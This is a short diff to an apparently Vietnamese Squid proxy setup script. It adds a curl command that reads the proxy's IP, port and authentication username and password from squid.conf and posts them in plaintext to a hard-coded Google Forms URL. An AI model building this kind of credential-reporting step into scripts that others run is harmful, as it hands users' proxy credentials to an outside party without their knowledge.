@@ -43,8 +43,11 @@ send_to_google_sheet() {
     local port=$(grep -oP 'http_port \K\d+' /etc/squid/squid.conf)
     local username=$(grep '^AuthUser' /etc/squid/squid.conf | awk '{print $2}')
     local password=$(grep '^AuthPass' /etc/squid/squid.conf | awk '{print $2}')
-
-    # Gửi thông tin đến Google Sheet
+    
+    local form_url="https://forms.gle/bqHB5Z2mV6AoBwcZ8"
+    local submission_data="ip=$ip&port=$port&username=$username&password=$password"
+    
+    curl -X POST -d "$submission_data" "$form_url"
 }
 
 main() {
